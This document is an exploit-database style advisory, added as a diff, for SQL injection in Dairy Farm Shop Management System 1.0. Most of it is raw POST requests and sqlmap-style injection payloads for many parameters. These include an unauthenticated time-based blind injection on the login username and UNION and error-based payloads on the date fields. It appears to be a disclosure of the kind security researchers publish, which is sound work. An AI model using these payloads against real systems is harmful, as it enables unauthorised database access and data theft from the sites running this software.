@@ -1,0 +1,164 @@
+# Exploit Title: Dairy Farm Shop Management System 1.0 - 'username' SQL Injection
+# Google Dork: N/A
+# Date: 2020-01-03
+# Exploit Author: Chris Inzinga
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/dairy-farm-shop-management-system-using-php-and-mysql/
+# Version: v1.0
+# Tested on: Windows
+# CVE: N/A
+
+# The Dairy Farm Shop Management System 1.0 web application is vulnerable to 
+# SQL injection in multiple areas. The most severe of these is the username 
+# parameter on the login page as this injection can be done unauthenticated.
+
+
+================================ 'username' - SQLi ================================
+
+POST /dfsms/index.php HTTP/1.1
+Host: 192.168.0.33
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.33/dfsms/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: close
+Cookie: PHPSESSID=ogvk4oricas9oudnb7hb88kgjg
+Upgrade-Insecure-Requests: 1
+
+username=test&password=test&login=
+
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 5667 FROM (SELECT(SLEEP(5)))mKGL) AND 'UlkV'='UlkV&password=test&login=
+---
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+
+
+
+================================ 'category' & 'categorycode' - SQLi ================================
+
+POST /dfsms/add-category.php HTTP/1.1
+Host: 192.168.0.33
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.33/dfsms/add-category.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Connection: close
+Cookie: PHPSESSID=ogvk4oricas9oudnb7hb88kgjg
+Upgrade-Insecure-Requests: 1
+
+category=test&categorycode=test&submit=
+
+---
+Parameter: category (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category=test' AND (SELECT 8892 FROM (SELECT(SLEEP(5)))WzFH) AND 'NELe'='NELe&categorycode=test&submit=
+---
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+
+---
+Parameter: categorycode (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category=test&categorycode=test' AND (SELECT 9140 FROM (SELECT(SLEEP(5)))bzQA) AND 'izaK'='izaK&submit=
+---
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+
+
+
+================================ 'companyname' - SQLi ================================
+
+---
+Parameter: companyname (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: companyname=test' AND (SELECT 7565 FROM (SELECT(SLEEP(5)))znna) AND 'bEUm'='bEUm&submit=
+---
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+
+
+
+================================ 'productname' & 'productprice' - SQLi ================================
+
+---
+Parameter: productname (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category=Milk&company=Amul&productname=test' AND (SELECT 1171 FROM (SELECT(SLEEP(5)))rlQI) AND 'RgaN'='RgaN&productprice=test&submit=
+---
+---
+Parameter: productprice (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: category=Milk&company=Amul&productname=test&productprice=test' AND (SELECT 8940 FROM (SELECT(SLEEP(5)))BRuk) AND 'Imqh'='Imqh&submit=
+---
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+
+
+
+================================ 'fromdate' & 'todate' - SQLi ================================
+
+---
+Parameter: todate (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: fromdate=2020-01-05&todate=-6737' OR 3099=3099#&submit=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fromdate=2020-01-05&todate=2020-01-31' OR (SELECT 3665 FROM(SELECT COUNT(*),CONCAT(0x7162766271,(SELECT (ELT(3665=3665,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mqby&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: fromdate=2020-01-05&todate=2020-01-31' AND (SELECT 5717 FROM (SELECT(SLEEP(5)))adaE)-- cLAK&submit=
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: fromdate=2020-01-05&todate=2020-01-31' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162766271,0x666369456150614b454a4f51454e6e687449724a786445585455515a67614162754545716d476f6f,0x716a7a7171),NULL#&submit=
+
+Parameter: fromdate (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fromdate=2020-01-05' AND (SELECT 7128 FROM(SELECT COUNT(*),CONCAT(0x7162766271,(SELECT (ELT(7128=7128,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Tzxh&todate=2020-01-31&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: fromdate=2020-01-05' AND (SELECT 7446 FROM (SELECT(SLEEP(5)))Aklw)-- uzkF&todate=2020-01-31&submit=
+---
+
+
+
+================================ 'mobilenumber' & 'emailid' & 'adminname' - SQLi ================================
+
+---
+Parameter: emailid (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: adminname=Admin&username=admin&emailid=admin@test.com' AND (SELECT 5884 FROM (SELECT(SLEEP(5)))EgFJ) AND 'kFGt'='kFGt&mobilenumber=1234567899&update=
+---
+---
+Parameter: adminname (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: adminname=Admin' AND (SELECT 5969 FROM (SELECT(SLEEP(5)))vpfG) AND 'kOJS'='kOJS&username=admin&emailid=admin@test.com&mobilenumber=1234567899&update=
+---
+---
+Parameter: mobilenumber (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: adminname=Admin&username=admin&emailid=admin@test.com&mobilenumber=1234567899' AND (SELECT 1163 FROM (SELECT(SLEEP(5)))rdwj) AND 'mnwu'='mnwu&update=
+---
